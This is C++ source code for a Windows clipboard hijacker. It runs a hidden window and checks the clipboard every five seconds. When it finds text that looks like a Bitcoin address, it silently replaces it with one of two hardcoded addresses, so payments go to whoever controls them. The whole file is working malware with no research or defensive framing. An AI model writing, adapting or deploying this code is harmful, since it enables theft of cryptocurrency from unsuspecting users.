#include <Windows.h>
#include <iostream>
#include <cstring>

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

int startClipboardMonitoring() {
    // Create a hidden window
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = reinterpret_cast<LPCSTR>(L"ClipboardMonitorWindowClass");
    RegisterClass(&wc);

    HWND hwnd = CreateWindow(wc.lpszClassName, reinterpret_cast<LPCSTR>(L""), 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, nullptr, nullptr);

    if (!hwnd) {
        return -1;
    }

    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        if (OpenClipboard(nullptr)) {
            // Get text data from the clipboard
            HANDLE hClipboardData = GetClipboardData(CF_TEXT);
            if (hClipboardData != nullptr) {
                // Lock memory and get data
                char* pszText = static_cast<char*>(GlobalLock(hClipboardData));

                // Check clipboard content
                if (pszText != nullptr) {
                    std::string clipboardText(pszText);
                    GlobalUnlock(hClipboardData);

                    // If the length is 34 and starts with '1' or '3'
                    if (clipboardText.length() == 34 && (clipboardText[0] == '1' || clipboardText[0] == '3')) {
                        // Replace with the specified address
                        clipboardText = (clipboardText[0] == '1') ?
                                        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" : "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy";

                        // Put the modified text back into the clipboard
                        HGLOBAL hNewClipboardData = GlobalAlloc(GMEM_MOVEABLE, clipboardText.length() + 1);
                        if (hNewClipboardData != nullptr) {
                            LPVOID pNewClipboardData = GlobalLock(hNewClipboardData);
                            if (pNewClipboardData != nullptr) {
                                strncpy(static_cast<char*>(pNewClipboardData), clipboardText.c_str(), clipboardText.length());
                                static_cast<char*>(pNewClipboardData)[clipboardText.length()] = '\0';
                                GlobalUnlock(hNewClipboardData);

                                EmptyClipboard();
                                SetClipboardData(CF_TEXT, hNewClipboardData);
                            }
                        }
                    }
                }
            }
            CloseClipboard();
        }
        Sleep(5000);  // 5 seconds
    }
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    startClipboardMonitoring();
    return 0;
}
